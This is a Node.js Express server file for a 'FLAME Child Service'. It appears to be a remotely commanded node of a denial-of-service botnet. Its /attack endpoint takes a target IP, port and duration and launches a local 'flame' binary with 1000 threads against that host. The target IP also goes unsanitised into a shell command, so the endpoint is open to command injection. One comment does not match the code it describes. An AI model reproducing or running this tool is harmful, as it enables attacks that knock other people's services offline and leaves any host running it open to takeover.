const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());

const BIN_PATH = path.join(__dirname, 'flame');
const THREADS = 1000;

if (fs.existsSync(BIN_PATH)) {
    console.log(`✅ Binary found: ${BIN_PATH}`);
    fs.chmodSync(BIN_PATH, 0o755);
} else {
    console.error(`❌ Binary missing: ${BIN_PATH}`);
}

app.post('/attack', (req, res) => {
    const { ip, port, duration } = req.body;

    // ✅ FIXED: Added && operators
    if (!ip || !port || !duration) {
        return res.status(400).json({ error: 'Missing ip/port/duration' });
    }

    const portNum = parseInt(port);
    const durationNum = parseInt(duration);

    if (isNaN(portNum) || portNum < 1 || portNum > 65535) {
        return res.status(400).json({ error: 'Invalid port' });
    }

    if (isNaN(durationNum) || durationNum < 1 || durationNum > 3600) {
        return res.status(400).json({ error: 'Invalid duration' });
    }

    console.log(`🔥 CHILD ATTACK: ${ip}:${portNum} for ${durationNum}s with ${THREADS} threads`);

    if (!fs.existsSync(BIN_PATH)) {
        return res.status(500).json({ error: 'Binary not found' });
    }

    const cmd = `${BIN_PATH} ${ip} ${portNum} ${durationNum} ${THREADS}`;
    console.log(`🚀 Executing: ${cmd}`);

    exec(cmd, (error, stdout, stderr) => {
        if (error) console.log(`❌ Error: ${error.message}`);
        if (stdout) console.log(`stdout: ${stdout}`);
        if (stderr) console.log(`stderr: ${stderr}`);
    });

    res.json({
        status: 'ok',
        target: `${ip}:${portNum}`,
        duration: durationNum,
        threads: THREADS
    });
});

app.get('/health', (req, res) => {
    res.json({
        status: 'alive',
        binary: fs.existsSync(BIN_PATH),
        threads: THREADS
    });
});

app.get('/', (req, res) => {
    res.json({
        name: 'FLAME Child Service',
        version: '1.0.0',
        status: 'running',
        threads: THREADS
    });
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log(`🔥 Child service running on port ${PORT}`);
    console.log(`✅ Binary exists: ${fs.existsSync(BIN_PATH)}`);
    console.log(`🧵 Threads: ${THREADS}`);
});
